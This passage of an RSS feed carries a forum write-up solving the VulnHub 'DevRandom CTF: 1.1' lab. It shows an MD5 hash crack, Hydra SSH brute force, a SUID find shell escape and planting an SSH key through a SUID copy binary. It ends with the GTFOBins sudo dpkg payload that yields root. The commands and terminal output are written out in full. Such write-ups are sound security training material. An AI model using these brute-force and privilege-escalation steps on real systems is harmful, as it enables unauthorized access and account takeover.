+and what we need from it specially is the users that have access to consoles like : bash / sh / rbash ...
+
+    root:x:0:0:root:/root:/bin/bash
+    john:x:1000:1000:john,,,:/home/john:/bin/bash
+    lisa:x:1001:1001:,,,:/home/lisa:/bin/bash
+    henri:x:1002:1002:,,,:/home/henri:/bin/bash
+    wordpressftp:x:1003:1003:,,,:/var/www/html:/bin/rbash
+    victor:x:1004:1004:,,,:/home/victor:/bin/bash
+    trevor:x:1005:1005:,,,:/home/trevor:/bin/bash
+
+the users in the box are:
+
+    henri
+    john
+    lisa
+    root
+    trevor
+    victor
+    wordpressftp
+
+now let&#39;s try to get some passwords ...
+
+there is a weird file secret.php
+
+    &lt;?php //
+    Echo &quot;API:&quot;;
+    echo md5(base64_encode(&quot;
+    This stupid webadmin doesn&#39;t give me log access.. 
+    but i have his creds {victor:00a00cfc5745c3b59202ab06a67bb2dc} 
+    &quot;));
+    ?&gt;
+
+containing a MD5 hash (the length is 32)
+
+&gt; 00a00cfc5745c3b59202ab06a67bb2dc:irminsul
+
+let&#39;s continue looking for passwords ...
+
+we don&#39;t have access to home users ...
+
+so let&#39;s make a quick brute forcing for SSH with hydra
+
+`&gt; hydra -L userlist.txt -P passlist.txt ssh://192.168.1.148 -s 22 ssh`
+
+-L is for users list
+
+-P is for passwordlist
+
+ssh://192.168.1.148
+
+the IP address of the server
+
+-s for port (22)
+
+ssh ==&gt; the service name (ftp , smtp ...)
+
+    &gt; hydra -L userlist.txt -P passlist.txt ssh://192.168.1.148 -s 22 ssh
+    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-30 14:12:04
+    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+    [DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:7/p:0), ~3 tries per task
+    [DATA] attacking ssh://192.168.1.148:22/
+    [22][ssh] host: 192.168.1.148   login: victor   password: irminsul
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-30 14:12:12
+
+and we have some true credentianls
+
+&gt; [22][ssh] host: 192.168.1.148   login: victor   password: irminsul
+
+let&#39;s go to ssh
+
+and we are in :D
+
+    &gt; ssh victor@192.168.1.148
+    The authenticity of host &#39;192.168.1.148 (192.168.1.148)&#39; can&#39;t be established.
+    ECDSA key fingerprint is SHA256:qOCG5GMfENFo0Ox4TwxKShT8MsvBvYvR/ImJ1NHt5Go.
+    Are you sure you want to continue connecting (yes/no)? yes
+    Warning: Permanently added &#39;192.168.1.148&#39; (ECDSA) to the list of known hosts.
+    victor@192.168.1.148&#39;s password:
+    Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+    Last login: Tue Mar 24 15:48:26 2020 from 192.168.1.24
+    victor@lucifer:~$
+
+    victor@lucifer:~$ id
+    uid=1004(victor) gid=1004(victor) groups=1004(victor)
+    victor@lucifer:~$ pwd
+    /home/victor
+    victor@lucifer:~$ ls -la
+    total 32
+    drwxr-x--- 4 victor victor 4096 Mar 25 06:08 .
+    drwxr-xr-x 7 root   root   4096 Mar 23 16:29 ..
+    -rw-r--r-- 1 victor victor  220 Mar 19 06:43 .bash_logout
+    -rw-r--r-- 1 victor victor 3526 Mar 19 06:43 .bashrc
+    drwxr-xr-x 2 victor victor 4096 Mar 19 15:32 bin
+    drwx------ 3 victor victor 4096 Mar 19 08:10 .gnupg
+    -rw-r--r-- 1 victor victor  675 Mar 19 06:43 .profile
+    -rw------- 1 victor victor   53 Mar 19 17:27 .Xauthority
+    victor@lucifer:~$ cd bin
+    victor@lucifer:~/bin$ ls -la
+    total 320
+    drwxr-xr-x 2 victor victor   4096 Mar 19 15:32 .
+    drwxr-x--- 4 victor victor   4096 Mar 25 06:08 ..
+    -rwsrwsrwt 1 john   john   315904 Mar 19 06:50 find
+    victor@lucifer:~/bin$
+
+so we are in victor home folder and inside it we have a folder named bin with a weirdo file privileges ...
+
+`-rwsrwsrwt 1 john   john   315904 Mar 19 06:50 find`
+
+we are in victor folder and the file have john suid !
+
+by going to GTFOBins we&#39;ll get more about these kind of exploitations ..
+
+    GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+
+let&#39;s search for find and cause we have a normal user privileges we can only use SUID exploitation not the SUDO one
+
+`./find . -exec /bin/bash -p \; -quit`
+
+I changed sh to bash cause I like bash more :p, let&#39;s run it
+
+and we are john now :D
+
+    victor@lucifer:~/bin$ ./find . -exec /bin/bash -p \; -quit
+    bash-5.0$ id
+    uid=1004(victor) gid=1004(victor) euid=1000(john) egid=1000(john) groups=1000(john),1004(victor)
+
+let&#39;s go to the john home folder
+
+we have a weird hidden file
+
+    bash-5.0$ cd /home/john
+    bash-5.0$ ls -la
+    total 32
+    drwxr-x--- 3 john john 4096 Mar 25 04:24 .
+    drwxr-xr-x 7 root root 4096 Mar 23 16:29 ..
+    -rw-r--r-- 1 john john  220 Mar 18 19:31 .bash_logout
+    -rw-r--r-- 1 john john 3526 Mar 18 19:31 .bashrc
+    drwx------ 3 john john 4096 Mar 18 19:32 .gnupg
+    -rw-r--r-- 1 john john   12 Mar 19 08:38 .private
+    -rw-r--r-- 1 john john  675 Mar 18 19:31 .profile
+    -rw------- 1 john john  106 Mar 19 04:14 .Xauthority
+    bash-5.0$ cat .private
+    dropbox2010
+
+it looks like we have another password :D
+
+let&#39;s do another run with hydra with the new password
+
+    &gt; hydra -L userlist.txt -P passlist.txt ssh://192.168.1.148 -s 22 ssh
+    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-30 14:23:39
+    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+    [DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:7/p:0), ~4 tries per task
+    [DATA] attacking ssh://192.168.1.148:22/
+    [22][ssh] host: 192.168.1.148   login: lisa   password: dropbox2010
+    [22][ssh] host: 192.168.1.148   login: victor   password: irminsul
+    1 of 1 target successfully completed, 2 valid passwords found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-30 14:23:48
+
+so we have another user access
+
+&gt; [22][ssh] host: 192.168.1.148   login: lisa   password: dropbox2010
+
+we are in
+
+    lisa@lucifer:~$ id
+    uid=1001(lisa) gid=1001(lisa) groups=1001(lisa)
+    lisa@lucifer:~$ pwd
+    /home/lisa
+    lisa@lucifer:~$ ls -la
+    total 32
+    drwxr-x--- 5 lisa lisa 4096 Mar 30 08:23 .
+    drwxr-xr-x 7 root root 4096 Mar 23 16:29 ..
+    -rw-r--r-- 1 lisa lisa  220 Mar 18 19:34 .bash_logout
+    -rw-r--r-- 1 lisa lisa 3560 Mar 19 15:01 .bashrc
+    drwxr-xr-x 2 lisa lisa 4096 Mar 23 19:23 bin
+    drwx------ 3 lisa lisa 4096 Mar 30 08:23 .gnupg
+    drwxr-xr-x 3 lisa lisa 4096 Mar 19 15:01 .local
+    -rw-r--r-- 1 lisa lisa  675 Mar 18 19:34 .profile
+    lisa@lucifer:~$
+
+    looks like we have another bin folder !
+
+    lisa@lucifer:~$ cd bin
+    lisa@lucifer:~/bin$ ls -la
+    total 152
+    drwxr-xr-x 2 lisa  lisa   4096 Mar 23 19:23 .
+    drwxr-x--- 5 lisa  lisa   4096 Mar 30 08:23 ..
+    -rwsrws--T 1 henri lisa 146880 Mar 19 14:44 copy
+    lisa@lucifer:~/bin$
+
+and also another file with **henri** privileges and **lisa** too this time !
+
+by going back to GTFOBins and looking for any exploitation of this binary file
+
+in linux we have cp and not copy so it the same file
+
+`./copy -R /home/henri/ /home/lisa/bin/copied/`
+
+-R for recrusive
+
+for kind of folders and files stuff I like to use WINSCP
+
+it&#39;s a good interface that let you browse the files and folders :D
+
+I created a new folder named copied iside of our bin folder (lisa&#39;s bin folder) and give it 777 permissions so everyone can write there !
+
+let&#39;s run and see what we got ! ...
+
+and yes we were able to copy all the henri home folder inside our &quot;copied&quot; folder
+
+we have a text file &quot;flag.txt&quot; containing this :
+
+You&#39;re doning well. .
+
+keep going.. 
+
+it&#39;s says that we have to keep going ...
+
+nothing here what took my attention is the folder .ssh that we didn&#39;t see in other user&#39;s home
+
+so let&#39;s create an authorise key and try to copy it from lisa folder this time to henri .ssh folder :D
+
+am going to use puttygen for windows
+
+all what you have to do is clicking on generate and save the private key and also copy the authorized key
+
+`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoC/2V3NrKHIWnWh+VLQiXeUcRWnmAbmxEy0dOJrf/OLp6XbNWYvmsA/HujVxWz6OPNIAfAo3vntx4mzd4crpbMqF2c2ZZgDOdEwEMIBPkMf2yd58Ss7CewaP6jHLB/JbqSWjD0PhHv5WcwtsfBw7C1/C9qLB0CQcDitEyXy2YMATwmrQpKha9cu+gbc36laWIivKW3FCUwloNGtnajAJZi0i6lk0D36PM4qJo+JR0jBaSAlhgIOhsBoRpLVlNgW2SHGOnkSWmHKUjH3mKoFIuttbTCbBtg1EJzcmLK973fEAgXIXshZAwELgtPFebiu1pU6921G/ELFdCt2bn+aSTQ== rsa-key-20200330`
+
+I created a new file in lisa bin folder name &quot;authorized_keys&quot; so now let&#39;s copy it for henri&#39;s .ssh folder !
+
+`copy /home/lisa/bin/authorized_keys /home/henri/.ssh/authorized_keys`
+
+and try to login from ssh
+
+and we are in :D
+
+    login as: henri
+    Authenticating with public key &quot;rsa-key-20200330&quot;
+    Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+    henri@lucifer:~$ id
+    uid=1002(henri) gid=1002(henri) groups=1002(henri)
+    henri@lucifer:~$
+
+as we see our authorized key was copied and cause of that we are in
+
+I&#39;ll make a little pause to get some coffee and I&#39;ll get back ...
+
+am back !
+
+so let&#39;s run linenum.sh it a tool for linux enumeration
+
+or let&#39;s run linpeas.sh I like it more
+
+what I like in this tool it colorize the results so the most dangerous things they are looking in yellow and red
+
+You can write SUID file: /usr/local/bin/cmd
+
+let&#39;s run this file and see what will happen !
+
+we can only type cmd cause we have it inside OUR PATH
+
+or we can use the full path
+
+    henri@lucifer:~/dust$ /usr/local/bin/cmd
+    trevor@lucifer:~/dust$
+
+looks like we are with **trevor** now !
+
+nothing in his home folder let&#39;s use again that enumerating tool !
+
+we have a kind of sudo binary file we can use without password
+
+    [+] Testing &#39;sudo -l&#39; without password &amp; /etc/sudoers
+    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+    Matching Defaults entries for trevor on lucifer:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User trevor may run the following commands on lucifer:
+        (root) NOPASSWD: /usr/bin/dpkg
+
+From GTFOBins
+
+    TF=$(mktemp -d)echo &#39;exec /bin/sh&#39; &gt; $TF/x.shfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TFsudo dpkg -i x_1.0_all.deb
+
+so to exploit that we need to install FPM
+
+&gt;     Effing package management! Build packages for multiple platforms (deb, rpm, etc) with great ease and sanity.
+
+we can install that in windows if you have ruby but you&#39;ll face huge problems
+
+So we are going to use kali linux I already have a VM running ...
+
+if you don&#39;t have ruby
+
+you can install it in debian
+
+&gt; apt-get install ruby ruby-dev rubygems build-essential
+
+and after that you have to install FPM with gem
+
+&gt; gem install --no-document fpm
+
+I already have it in my kali so let&#39;s go directly to the exploitation ...
+
+I have already the package file &quot;x_1.0_all.deb&quot;
+
+Don&#39;t know what goes wrong with my kali but let&#39;s upload the package file and run it
+
+Oooh god what I did :p
+
+So we get the root privileges and that how I solved this box
+
+        trevor@lucifer:/tmp$ sudo dpkg -i x_1.0_all.deb
+        Selecting previously unselected package x.
+        (Reading database ... 40777 files and directories currently installed.)
+        Preparing to unpack x_1.0_all.deb ...
+        # id
+        uid=0(root) gid=0(root) groups=0(root)
+        # cd /root
+        # ls
+        flag.txt
+        # cat flag
+        cat: flag: No such file or directory
+        # cat flag.txt
+        WELl DONE
+
+        echo &quot;THISISTHEFLAGTHISISTHEFLAG\!\!\!\@\@\@###&quot; | base64 &gt; `thisistheflag.txt`
+[/details]</description>
+    
+    <lastBuildDate>Wed, 01 Apr 2020 18:58:01 +0000</lastBuildDate>
+    <category>CTF</category>
+    <atom:link href="https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>(VulnHub) DevRandom CTF: 1.1 | WriteUp</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195/2</link>
+        <pubDate>Sat, 01 Aug 2020 10:58:02 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-20195-2</guid>
+        <source url="https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195.rss">(VulnHub) DevRandom CTF: 1.1 | WriteUp</source>
+      </item>
+      <item>
+        <title>(VulnHub) DevRandom CTF: 1.1 | WriteUp</title>
+        <dc:creator><![CDATA[DamaneDz]]></dc:creator>
+        <description><![CDATA[
+            <p>Hello guys,<br>
+This is gonna be my writeup for ( DevRandom CTF: 1.1 ) from <a href="https://www.vulnhub.com/entry/devrandom-ctf-11,450/" rel="noopener nofollow ugc">VulnHub</a>.<br>
+For challengers and CTF players you can try it before reading my solution.<br>
+P.S:both video and text writeup are included.</p>
+
+Summary <a href="https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195/1">(click for more details)</a>
+          <p><a href="https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195/1</link>
+        <pubDate>Wed, 01 Apr 2020 18:58:01 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-20195-1</guid>
+        <source url="https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195.rss">(VulnHub) DevRandom CTF: 1.1 | WriteUp</source>
+      </item>
+  </channel>
+</rss>
